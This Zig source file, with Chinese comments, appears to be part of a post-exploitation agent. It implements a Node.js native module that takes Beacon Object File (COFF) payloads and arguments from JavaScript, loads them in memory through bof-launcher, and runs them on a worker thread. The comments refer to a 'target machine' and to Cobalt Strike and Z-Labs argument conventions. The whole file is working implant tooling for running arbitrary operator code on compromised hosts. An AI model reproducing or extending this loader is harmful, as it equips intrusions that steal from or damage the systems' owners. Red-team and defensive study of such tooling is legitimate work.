const std = @import("std");
const tokota = @import("tokota");

comptime {
    tokota.exportModule(@This());
}

const c = @cImport({
    @cInclude("bof_launcher_api.h");
});

/// bof-launcher 要求先 bofLauncherInit() 才能加载对象（未初始化时
/// bofObjectInitFromMemory 恒返回 -1）；进程内只初始化一次。
var launcher_init_flag = std.atomic.Value(bool).init(false);

fn ensureLauncherInit() void {
    if (!launcher_init_flag.swap(true, .seq_cst)) {
        _ = c.bofLauncherInit();
    }
}

// bofArgsAdd 的 C 原型收 [*c]u8（可变指针），字符串一律持 []u8
fn optString(call: tokota.Call, params: tokota.Object, key: [:0]const u8, allocator: std.mem.Allocator) !?[]u8 {
    const val = params.get(key) catch return null;
    if (try val.isNullOrUndefined(call.env)) return null;
    const coerced = try val.stringCoerce(call.env);
    const s = try coerced.stringAlloc(call.env, allocator);
    if (s.len == 0) {
        allocator.free(s);
        return null;
    }
    return s;
}

/// 把 args 文本按空白拆成 token（Z-Labs 多参模式用）。不经 shell，引号按字面量处理。
fn splitArgs(allocator: std.mem.Allocator, text: []const u8) ![][]u8 {
    var list: std.ArrayList([]u8) = .empty;
    errdefer {
        for (list.items) |a| allocator.free(a);
        list.deinit(allocator);
    }
    var it = std.mem.tokenizeAny(u8, text, " \t\r\n");
    while (it.next()) |tok| try list.append(allocator, try allocator.dupe(u8, tok));
    return list.toOwnedSlice(allocator);
}

pub fn executeBof(call: tokota.Call) !tokota.Promise {
    const allocator = std.heap.c_allocator;
    ensureLauncherInit();
    const args = try call.argsAs(.{tokota.Val});
    const params = args[0].object(call.env);

    const bof_val = params.get("bof_file") catch return error.BofFileRequired;
    if (try bof_val.isNullOrUndefined(call.env)) return error.BofFileRequired;
    const bof_buf = try bof_val.buffer(call.env);
    // COFF 字节拷到堆：JS Buffer 归 GC 管，不能被 worker 线程引用
    const bof_bytes = try allocator.dupe(u8, bof_buf.data);

    const args_text = try optString(call, params, "args", allocator);
    const zlab = params.getT("zlab_args", bool) catch false;

    // bof_bytes / args_text 所有权移交 BofTask：prepare 成功后由 task.deinit
    // 统一释放，失败路径在下方手动释放（agentscan cmd_args 同款模式）
    const task = BofTask.prepare(allocator, bof_bytes, args_text, zlab) catch |e| {
        allocator.free(bof_bytes);
        if (args_text) |t| allocator.free(t);
        return e;
    };
    errdefer task.deinit(false);

    // 耗时的 COFF 加载与执行放 libuv 线程池（AsyncWorker），导出 Promise，
    // 不阻塞目标机 Node 事件循环
    const promise, const deferred = try call.env.promise();
    task.deferred = deferred;
    task.work = try call.env.asyncWorkerT(task, BofTask.execute, BofTask.complete, .{
        .name = "bof-execute",
    });
    errdefer task.work.delete(call.env) catch {};

    try task.work.schedule(call.env);
    return promise;
}

// 一次 BOF 执行任务的全部堆上状态（跨 AsyncWorker 线程传递）。
const BofTask = struct {
    allocator: std.mem.Allocator,
    bof_bytes: []u8,
    /// CS 单参模式的原始整串（null = 未提供）
    args_text: ?[]u8,
    /// Z-Labs 模式的预拆 token（仅 zlab=true 时非空）
    tokens: [][]u8 = &.{},
    zlab: bool,
    deferred: tokota.Deferred = undefined,
    work: tokota.async.Worker = undefined,
    // execute 产物（complete resolve 后所有权移交 JS 侧字符串），
    // null 时 complete 走 reject。
    output: ?[]const u8 = null,

    fn prepare(allocator: std.mem.Allocator, bof_bytes: []u8, args_text: ?[]u8, zlab: bool) !*BofTask {
        var tokens: [][]u8 = &.{};
        errdefer {
            for (tokens) |t| allocator.free(t);
            if (tokens.len > 0) allocator.free(tokens);
        }
        if (zlab) {
            if (args_text) |t| tokens = try splitArgs(allocator, t);
        }

        const task = try allocator.create(BofTask);
        task.* = .{
            .allocator = allocator,
            .bof_bytes = bof_bytes,
            .args_text = args_text,
            .tokens = tokens,
            .zlab = zlab,
        };
        return task;
    }

    // 释放全部堆上状态；resolved 为 true 表示 output 字符串已移交 JS 侧。
    fn deinit(self: *BofTask, resolved: bool) void {
        const allo = self.allocator;
        if (self.output) |o| {
            if (!resolved) allo.free(o);
        }
        allo.free(self.bof_bytes);
        if (self.args_text) |t| allo.free(t);
        for (self.tokens) |t| allo.free(t);
        if (self.tokens.len > 0) allo.free(self.tokens);
        allo.destroy(self);
    }

    // libuv 线程池：加载并执行 COFF，收集输出。解析/运行失败按旧契约以
    // "[ERRO]" 结果文本 resolve（是工具结果，不是异常）；仅 OOM 走 reject。
    fn execute(self: *BofTask) !void {
        const allocator = self.allocator;

        var bof_handle: c.BofObjectHandle = undefined;
        const init_rc = c.bofObjectInitFromMemory(self.bof_bytes.ptr, @intCast(self.bof_bytes.len), &bof_handle);
        if (init_rc < 0) {
            self.output = try std.fmt.allocPrint(allocator, "[ERRO] failed to parse BOF object from memory (code: {d}, size: {d})", .{ init_rc, self.bof_bytes.len });
            return;
        }
        defer c.bofObjectRelease(bof_handle);

        var bof_args: ?*c.BofArgs = null;
        if (c.bofArgsInit(&bof_args) < 0) {
            self.output = try std.fmt.allocPrint(allocator, "[ERRO] bofArgsInit failed", .{});
            return;
        }
        defer c.bofArgsRelease(bof_args);

        c.bofArgsBegin(bof_args);
        if (self.zlab) {
            // Z-Labs 多参模式：逐 token Add，"i:"（u32）/"s:"（u16）/"str:"/"z:"（字符串）
            // 前缀由 bof_launcher 解析打包
            for (self.tokens) |tok| {
                _ = c.bofArgsAdd(bof_args, tok.ptr, @intCast(tok.len));
            }
        } else if (self.args_text) |blob| {
            // CS 惯例：整串单 blob，BOF 侧 entrypoint(char*, int) 自行解析
            if (blob.len > 0) {
                _ = c.bofArgsAdd(bof_args, blob.ptr, @intCast(blob.len));
            }
        }
        c.bofArgsEnd(bof_args);

        var context: ?*c.BofContext = null;
        const run_rc = c.bofObjectRun(bof_handle, @constCast(c.bofArgsGetBuffer(bof_args)), c.bofArgsGetBufferSize(bof_args), &context);
        if (run_rc < 0) {
            self.output = try std.fmt.allocPrint(allocator, "[ERRO] bofObjectRun failed (code: {d})", .{run_rc});
            return;
        }
        defer c.bofContextRelease(context);

        const output = c.bofContextGetOutput(context, null);
        if (output) |out| {
            const olen = std.mem.len(out);
            self.output = try std.fmt.allocPrint(allocator, "[INFO] BOF output:\n{s}", .{out[0..olen]});
        } else {
            self.output = try allocator.dupe(u8, "[INFO] BOF executed, no output");
        }
    }

    // JS 线程：resolve/reject Promise 并释放任务状态。
    fn complete(self: *BofTask, env: tokota.Env, err: anyerror!void) !void {
        if (err) |_| {
            defer self.deinit(true);
            if (self.output) |o| {
                try self.deferred.resolve(env, o);
            } else {
                try self.deferred.reject(env, try env.err("bof execute failed", {}));
            }
        } else |_| {
            defer self.deinit(false);
            return self.deferred.reject(env, try env.err("bof execute failed: napi error", {}));
        }
    }
};
